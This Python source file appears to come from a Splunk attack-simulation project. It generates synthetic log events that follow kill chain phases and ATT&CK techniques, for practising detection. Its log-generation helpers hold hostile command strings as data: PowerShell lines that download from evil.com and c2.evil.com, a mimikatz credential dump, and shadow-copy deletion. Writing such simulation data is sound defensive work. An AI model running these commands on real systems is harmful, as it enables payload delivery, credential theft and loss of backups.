"""
Kill Chain Simulation Engine.

Orchestrates attack simulations based on threat actor profiles,
generating realistic attack sequences that follow the Lockheed Martin
Cyber Kill Chain and MITRE ATT&CK framework.

Inspired by:
- MITRE Caldera: https://caldera.mitre.org/
- Splunk Attack Range: https://github.com/splunk/attack_range
- Atomic Red Team: https://atomicredteam.io/

References:
- Lockheed Martin Cyber Kill Chain
- MITRE ATT&CK Enterprise Matrix
"""

import asyncio
import logging
import random
import secrets
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, AsyncGenerator, Callable

from faux_splunk_cloud.attack_simulation.mitre_attack import (
    DataSource,
    Tactic,
    Technique,
    TECHNIQUE_LIBRARY,
    get_technique_by_id,
)
from faux_splunk_cloud.attack_simulation.threat_actors import (
    ThreatActorProfile,
    ThreatLevel,
    get_threat_actor_by_id,
)

logger = logging.getLogger(__name__)


class CampaignStatus(str, Enum):
    """Status of an attack campaign."""

    PENDING = "pending"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    DETECTED = "detected"
    FAILED = "failed"


class AttackPhase(str, Enum):
    """
    Lockheed Martin Cyber Kill Chain phases.

    Mapped to MITRE ATT&CK tactics for comprehensive coverage.
    """

    # Kill Chain phases
    RECONNAISSANCE = "reconnaissance"
    WEAPONIZATION = "weaponization"
    DELIVERY = "delivery"
    EXPLOITATION = "exploitation"
    INSTALLATION = "installation"
    COMMAND_AND_CONTROL = "command_and_control"
    ACTIONS_ON_OBJECTIVES = "actions_on_objectives"


# Mapping from Kill Chain phases to ATT&CK tactics
KILL_CHAIN_TO_ATTACK_TACTICS: dict[AttackPhase, list[Tactic]] = {
    AttackPhase.RECONNAISSANCE: [Tactic.RECONNAISSANCE],
    AttackPhase.WEAPONIZATION: [Tactic.RESOURCE_DEVELOPMENT],
    AttackPhase.DELIVERY: [Tactic.INITIAL_ACCESS],
    AttackPhase.EXPLOITATION: [Tactic.EXECUTION],
    AttackPhase.INSTALLATION: [Tactic.PERSISTENCE, Tactic.PRIVILEGE_ESCALATION],
    AttackPhase.COMMAND_AND_CONTROL: [Tactic.COMMAND_AND_CONTROL],
    AttackPhase.ACTIONS_ON_OBJECTIVES: [
        Tactic.CREDENTIAL_ACCESS,
        Tactic.DISCOVERY,
        Tactic.LATERAL_MOVEMENT,
        Tactic.COLLECTION,
        Tactic.EXFILTRATION,
        Tactic.IMPACT,
    ],
}


@dataclass
class AttackStep:
    """A single step in an attack sequence."""

    id: str
    technique: Technique
    phase: AttackPhase
    tactic: Tactic
    timestamp: datetime
    success: bool = True
    detected: bool = False
    artifacts: list[dict[str, Any]] = field(default_factory=list)
    logs_generated: list[dict[str, Any]] = field(default_factory=list)
    parent_step_id: str | None = None


@dataclass
class AttackCampaign:
    """
    An attack campaign represents a full intrusion lifecycle.

    Campaigns are based on threat actor profiles and execute
    techniques through the kill chain phases.
    """

    id: str
    name: str
    threat_actor: ThreatActorProfile
    target_instance_id: str
    status: CampaignStatus = CampaignStatus.PENDING

    # Campaign timeline
    start_time: datetime | None = None
    end_time: datetime | None = None
    current_phase: AttackPhase = AttackPhase.RECONNAISSANCE

    # Attack execution
    steps: list[AttackStep] = field(default_factory=list)
    current_step_index: int = 0

    # Campaign configuration
    speed_multiplier: float = 1.0  # 1.0 = real time, 10.0 = 10x faster
    auto_advance: bool = True  # Automatically progress through phases

    # Objectives
    objectives: list[str] = field(default_factory=list)
    objectives_completed: list[str] = field(default_factory=list)

    # Detection simulation
    detection_probability: float = 0.1  # Base detection probability
    detected_at_step: int | None = None


@dataclass
class CampaignConfig:
    """Configuration for creating an attack campaign."""

    threat_actor_id: str
    target_instance_id: str
    name: str | None = None

    # Campaign options
    speed_multiplier: float = 60.0  # Default: 1 minute = 1 hour of dwell time
    include_phases: list[AttackPhase] | None = None  # None = all phases
    max_steps: int = 100
    start_immediately: bool = True

    # Objectives (what the attacker is trying to achieve)
    objectives: list[str] = field(default_factory=lambda: [
        "establish_persistence",
        "harvest_credentials",
        "lateral_movement",
        "data_exfiltration",
    ])

    # Noise level override (None = use threat actor default)
    noise_level_override: float | None = None

    # Detection settings
    enable_detection_simulation: bool = True
    detection_probability_modifier: float = 1.0


class KillChainEngine:
    """
    Engine for orchestrating attack simulations.

    Generates realistic attack sequences based on threat actor profiles,
    producing security logs and artifacts that can be ingested into Splunk.
    """

    def __init__(self) -> None:
        self._campaigns: dict[str, AttackCampaign] = {}
        self._running_tasks: dict[str, asyncio.Task[None]] = {}
        self._log_handlers: list[Callable[[dict[str, Any]], None]] = []

    def register_log_handler(
        self, handler: Callable[[dict[str, Any]], None]
    ) -> None:
        """Register a handler to receive generated log events."""
        self._log_handlers.append(handler)

    def _emit_log(self, log_event: dict[str, Any]) -> None:
        """Emit a log event to all registered handlers."""
        for handler in self._log_handlers:
            try:
                handler(log_event)
            except Exception as e:
                logger.error(f"Error in log handler: {e}")

    def create_campaign(self, config: CampaignConfig) -> AttackCampaign:
        """Create a new attack campaign."""
        threat_actor = get_threat_actor_by_id(config.threat_actor_id)
        if not threat_actor:
            raise ValueError(f"Unknown threat actor: {config.threat_actor_id}")

        campaign_id = f"campaign-{secrets.token_hex(8)}"
        campaign_name = config.name or f"{threat_actor.name} Campaign"

        campaign = AttackCampaign(
            id=campaign_id,
            name=campaign_name,
            threat_actor=threat_actor,
            target_instance_id=config.target_instance_id,
            speed_multiplier=config.speed_multiplier,
            objectives=config.objectives,
        )

        # Plan the attack sequence based on threat actor profile
        self._plan_attack_sequence(campaign, config)

        self._campaigns[campaign_id] = campaign

        if config.start_immediately:
            self.start_campaign(campaign_id)

        return campaign

    def _plan_attack_sequence(
        self, campaign: AttackCampaign, config: CampaignConfig
    ) -> None:
        """Plan the attack sequence based on threat actor profile."""
        threat_actor = campaign.threat_actor

        # Determine which phases to include
        phases = config.include_phases or list(AttackPhase)

        # Get techniques available to this threat actor
        available_techniques = [
            get_technique_by_id(tid)
            for tid in threat_actor.techniques
            if get_technique_by_id(tid) is not None
        ]

        # Build attack sequence through kill chain phases
        current_time = datetime.utcnow()
        step_index = 0

        for phase in phases:
            if step_index >= config.max_steps:
                break

            # Get tactics for this phase
            tactics = KILL_CHAIN_TO_ATTACK_TACTICS.get(phase, [])

            # Find techniques that match these tactics
            phase_techniques = [
                t for t in available_techniques
                if any(tactic in t.tactics for tactic in tactics)
            ]

            if not phase_techniques:
                continue

            # Select techniques based on threat actor behavior
            num_techniques = self._calculate_techniques_per_phase(
                phase, threat_actor
            )

            selected_techniques = random.sample(
                phase_techniques,
                min(num_techniques, len(phase_techniques))
            )

            for technique in selected_techniques:
                if step_index >= config.max_steps:
                    break

                # Determine timing based on dwell time
                time_offset = self._calculate_time_offset(
                    step_index, threat_actor, campaign.speed_multiplier
                )

                step = AttackStep(
                    id=f"step-{step_index:04d}",
                    technique=technique,
                    phase=phase,
                    tactic=technique.tactics[0],  # Primary tactic
                    timestamp=current_time + time_offset,
                    parent_step_id=campaign.steps[-1].id if campaign.steps else None,
                )

                campaign.steps.append(step)
                step_index += 1

    def _calculate_techniques_per_phase(
        self, phase: AttackPhase, actor: ThreatActorProfile
    ) -> int:
        """Calculate how many techniques to use per phase based on actor profile."""
        base_counts = {
            AttackPhase.RECONNAISSANCE: 1,
            AttackPhase.WEAPONIZATION: 1,
            AttackPhase.DELIVERY: 2,
            AttackPhase.EXPLOITATION: 2,
            AttackPhase.INSTALLATION: 3,
            AttackPhase.COMMAND_AND_CONTROL: 2,
            AttackPhase.ACTIONS_ON_OBJECTIVES: 5,
        }

        base = base_counts.get(phase, 2)

        # More sophisticated actors use more techniques
        sophistication_multiplier = {
            ThreatLevel.SCRIPT_KIDDIE: 0.5,
            ThreatLevel.OPPORTUNISTIC: 0.7,
            ThreatLevel.ORGANIZED_CRIME: 1.0,
            ThreatLevel.HACKTIVIST: 0.8,
            ThreatLevel.INSIDER_THREAT: 0.6,
            ThreatLevel.APT: 1.5,
            ThreatLevel.NATION_STATE: 2.0,
        }.get(actor.threat_level, 1.0)

        return max(1, int(base * sophistication_multiplier))

    def _calculate_time_offset(
        self,
        step_index: int,
        actor: ThreatActorProfile,
        speed_multiplier: float,
    ) -> timedelta:
        """Calculate time offset for a step based on actor dwell time."""
        min_dwell, max_dwell = actor.dwell_time_days

        # Distribute steps across dwell time
        total_dwell_hours = random.randint(min_dwell * 24, max_dwell * 24)

        # Earlier steps happen sooner, later steps spread out
        progress = step_index / 20  # Assume ~20 steps per campaign
        hours_offset = int(total_dwell_hours * progress * random.uniform(0.5, 1.5))

        # Apply speed multiplier (higher = faster simulation)
        actual_seconds = (hours_offset * 3600) / speed_multiplier

        return timedelta(seconds=actual_seconds)

    def start_campaign(self, campaign_id: str) -> None:
        """Start executing an attack campaign."""
        campaign = self._campaigns.get(campaign_id)
        if not campaign:
            raise ValueError(f"Campaign not found: {campaign_id}")

        if campaign.status == CampaignStatus.RUNNING:
            return

        campaign.status = CampaignStatus.RUNNING
        campaign.start_time = datetime.utcnow()

        # Start background task for campaign execution
        task = asyncio.create_task(self._execute_campaign(campaign_id))
        self._running_tasks[campaign_id] = task

        logger.info(f"Started campaign {campaign_id}: {campaign.name}")

    async def _execute_campaign(self, campaign_id: str) -> None:
        """Execute campaign steps asynchronously."""
        campaign = self._campaigns.get(campaign_id)
        if not campaign:
            return

        try:
            for i, step in enumerate(campaign.steps):
                if campaign.status != CampaignStatus.RUNNING:
                    break

                # Wait for scheduled time
                wait_time = (step.timestamp - datetime.utcnow()).total_seconds()
                if wait_time > 0:
                    await asyncio.sleep(min(wait_time, 60))  # Max 60s per wait

                # Execute the step
                await self._execute_step(campaign, step)

                # Check for detection
                if self._check_detection(campaign, step):
                    campaign.status = CampaignStatus.DETECTED
                    campaign.detected_at_step = i
                    logger.info(f"Campaign {campaign_id} detected at step {i}")
                    break

                campaign.current_step_index = i + 1

            if campaign.status == CampaignStatus.RUNNING:
                campaign.status = CampaignStatus.COMPLETED

            campaign.end_time = datetime.utcnow()

        except asyncio.CancelledError:
            campaign.status = CampaignStatus.PAUSED
        except Exception as e:
            logger.error(f"Campaign execution error: {e}")
            campaign.status = CampaignStatus.FAILED

    async def _execute_step(
        self, campaign: AttackCampaign, step: AttackStep
    ) -> None:
        """Execute a single attack step and generate logs."""
        technique = step.technique

        # Generate log events based on technique data sources
        logs = self._generate_logs_for_technique(campaign, step)

        for log in logs:
            self._emit_log(log)
            step.logs_generated.append(log)

        # Determine success based on noise level
        noise = campaign.threat_actor.noise_level
        step.success = random.random() > (noise * 0.1)  # Higher noise = more failures

        logger.debug(
            f"Executed step {step.id}: {technique.name} "
            f"(success={step.success})"
        )

    def _generate_logs_for_technique(
        self,
        campaign: AttackCampaign,
        step: AttackStep,
    ) -> list[dict[str, Any]]:
        """Generate realistic log events for a technique execution."""
        logs = []
        technique = step.technique
        actor = campaign.threat_actor

        # Generate logs for each data source
        for data_source in technique.data_sources:
            log = self._generate_log_for_data_source(
                data_source, technique, campaign, step
            )
            if log:
                logs.append(log)

        return logs

    def _generate_log_for_data_source(
        self,
        data_source: DataSource,
        technique: Technique,
        campaign: AttackCampaign,
        step: AttackStep,
    ) -> dict[str, Any] | None:
        """Generate a log event for a specific data source."""
        timestamp = step.timestamp.isoformat()
        actor = campaign.threat_actor

        # Base log structure
        base_log = {
            "_time": timestamp,
            "campaign_id": campaign.id,
            "technique_id": technique.id,
            "technique_name": technique.name,
            "threat_actor": actor.id,
            "threat_level": actor.threat_level.value,
        }

        # Generate source-specific log content
        if data_source == DataSource.PROCESS_CREATION:
            return {
                **base_log,
                "sourcetype": "sysmon",
                "EventCode": 1,
                "Image": self._get_suspicious_process(technique),
                "CommandLine": self._get_command_line(technique),
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": self._get_username(actor),
                "ComputerName": f"WORKSTATION-{random.randint(100, 999)}",
            }

        elif data_source == DataSource.POWERSHELL_LOG:
            return {
                **base_log,
                "sourcetype": "wineventlog:powershell",
                "EventCode": 4104,
                "ScriptBlockText": self._get_powershell_script(technique),
                "ComputerName": f"WORKSTATION-{random.randint(100, 999)}",
            }

        elif data_source == DataSource.AUTHENTICATION_LOG:
            return {
                **base_log,
                "sourcetype": "wineventlog:security",
                "EventCode": random.choice([4624, 4625]),  # Success/Failure
                "LogonType": random.choice([2, 3, 10]),
                "TargetUserName": self._get_username(actor),
                "IpAddress": self._get_attacker_ip(actor),
                "ComputerName": f"DC-{random.randint(1, 3)}",
            }

        elif data_source == DataSource.NETWORK_CONNECTION:
            return {
                **base_log,
                "sourcetype": "sysmon",
                "EventCode": 3,
                "Image": self._get_suspicious_process(technique),
                "DestinationIp": self._get_c2_ip(actor),
                "DestinationPort": random.choice([80, 443, 8080, 4444]),
                "Protocol": "tcp",
            }

        elif data_source == DataSource.DNS_QUERY:
            return {
                **base_log,
                "sourcetype": "sysmon",
                "EventCode": 22,
                "QueryName": self._get_suspicious_domain(actor),
                "QueryResults": self._get_c2_ip(actor),
            }

        elif data_source == DataSource.PROXY_LOG:
            return {
                **base_log,
                "sourcetype": "squid",
                "src_ip": f"192.168.1.{random.randint(10, 250)}",
                "dest_host": self._get_suspicious_domain(actor),
                "method": "POST",
                "bytes_out": random.randint(100, 100000),
                "user_agent": self._get_user_agent(actor),
            }

        elif data_source == DataSource.FILE_CREATION:
            return {
                **base_log,
                "sourcetype": "sysmon",
                "EventCode": 11,
                "TargetFilename": self._get_suspicious_file(technique),
                "Image": self._get_suspicious_process(technique),
            }

        elif data_source == DataSource.REGISTRY_KEY_MODIFICATION:
            return {
                **base_log,
                "sourcetype": "sysmon",
                "EventCode": 13,
                "TargetObject": self._get_registry_key(technique),
                "Details": self._get_command_line(technique),
            }

        return None

    def _get_suspicious_process(self, technique: Technique) -> str:
        """Get a suspicious process path based on technique."""
        processes = {
            "T1059.001": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "T1059.003": "C:\\Windows\\System32\\cmd.exe",
            "T1047": "C:\\Windows\\System32\\wbem\\WMIC.exe",
            "T1003.001": "C:\\Windows\\Temp\\mimikatz.exe",
            "T1053.005": "C:\\Windows\\System32\\schtasks.exe",
        }
        return processes.get(technique.id, "C:\\Windows\\System32\\rundll32.exe")

    def _get_command_line(self, technique: Technique) -> str:
        """Get a realistic command line for the technique."""
        commands = {
            "T1059.001": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
            "T1059.003": "cmd.exe /c whoami && net user && systeminfo",
            "T1047": 'wmic process call create "cmd.exe /c calc.exe"',
            "T1003.001": "mimikatz.exe sekurlsa::logonpasswords exit",
            "T1053.005": 'schtasks /create /tn "SecurityUpdate" /tr "powershell.exe" /sc daily',
            "T1082": "systeminfo",
            "T1087.001": "net user",
            "T1490": "vssadmin.exe delete shadows /all /quiet",
        }
        return commands.get(technique.id, f"rundll32.exe {technique.name}")

    def _get_powershell_script(self, technique: Technique) -> str:
        """Get a PowerShell script block for the technique."""
        scripts = {
            "T1059.001": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
            "T1105": "Invoke-WebRequest -Uri 'http://c2.evil.com/payload.exe' -OutFile 'C:\\temp\\payload.exe'",
        }
        return scripts.get(technique.id, "$x = Get-Process")

    def _get_username(self, actor: ThreatActorProfile) -> str:
        """Get a username based on threat actor type."""
        if actor.threat_level == ThreatLevel.INSIDER_THREAT:
            return random.choice(["john.doe", "jane.smith", "bob.wilson"])
        return random.choice(["SYSTEM", "Administrator", "svc_backup"])

    def _get_attacker_ip(self, actor: ThreatActorProfile) -> str:
        """Get an attacker IP based on attributed country."""
        ip_ranges = {
            "Russia": f"185.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "China": f"222.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "North Korea": f"175.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }
        country = actor.attributed_country
        if country and country in ip_ranges:
            return ip_ranges[country]
        return f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def _get_c2_ip(self, actor: ThreatActorProfile) -> str:
        """Get a C2 server IP."""
        return f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def _get_suspicious_domain(self, actor: ThreatActorProfile) -> str:
        """Get a suspicious domain based on threat actor."""
        domains = [
            f"update-{secrets.token_hex(4)}.com",
            f"cdn-{secrets.token_hex(4)}.net",
            f"api-{secrets.token_hex(4)}.io",
            f"secure-{actor.id.replace('_', '-')}.com",
        ]
        return random.choice(domains)

    def _get_user_agent(self, actor: ThreatActorProfile) -> str:
        """Get a user agent string."""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        ]
        return random.choice(agents)

    def _get_suspicious_file(self, technique: Technique) -> str:
        """Get a suspicious file path."""
        files = [
            f"C:\\Windows\\Temp\\{secrets.token_hex(4)}.exe",
            f"C:\\Users\\Public\\{secrets.token_hex(4)}.dll",
            f"C:\\ProgramData\\{secrets.token_hex(4)}.ps1",
        ]
        return random.choice(files)

    def _get_registry_key(self, technique: Technique) -> str:
        """Get a registry key based on technique."""
        keys = {
            "T1547.001": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate",
            "T1543.003": "HKLM\\System\\CurrentControlSet\\Services\\FakeService",
        }
        return keys.get(technique.id, "HKCU\\Software\\Microsoft\\Windows\\Malware")

    def _check_detection(
        self, campaign: AttackCampaign, step: AttackStep
    ) -> bool:
        """Check if the current step would be detected."""
        # Base detection probability from campaign
        base_prob = campaign.detection_probability

        # Modify based on threat actor noise level
        noise = campaign.threat_actor.noise_level
        detection_prob = base_prob * (1 + noise)

        # High severity techniques are more likely to be detected
        severity_modifiers = {
            "low": 0.5,
            "medium": 1.0,
            "high": 1.5,
            "critical": 2.0,
        }
        severity_mod = severity_modifiers.get(step.technique.severity, 1.0)
        detection_prob *= severity_mod

        # Check if detected
        return random.random() < detection_prob

    def pause_campaign(self, campaign_id: str) -> None:
        """Pause a running campaign."""
        campaign = self._campaigns.get(campaign_id)
        if campaign and campaign.status == CampaignStatus.RUNNING:
            campaign.status = CampaignStatus.PAUSED
            task = self._running_tasks.get(campaign_id)
            if task:
                task.cancel()

    def get_campaign(self, campaign_id: str) -> AttackCampaign | None:
        """Get a campaign by ID."""
        return self._campaigns.get(campaign_id)

    def list_campaigns(
        self, instance_id: str | None = None
    ) -> list[AttackCampaign]:
        """List all campaigns, optionally filtered by instance."""
        campaigns = list(self._campaigns.values())
        if instance_id:
            campaigns = [
                c for c in campaigns
                if c.target_instance_id == instance_id
            ]
        return campaigns

    def get_campaign_logs(
        self, campaign_id: str
    ) -> list[dict[str, Any]]:
        """Get all logs generated by a campaign."""
        campaign = self._campaigns.get(campaign_id)
        if not campaign:
            return []

        logs = []
        for step in campaign.steps:
            logs.extend(step.logs_generated)

        return sorted(logs, key=lambda x: x.get("_time", ""))


# Global engine instance
kill_chain_engine = KillChainEngine()
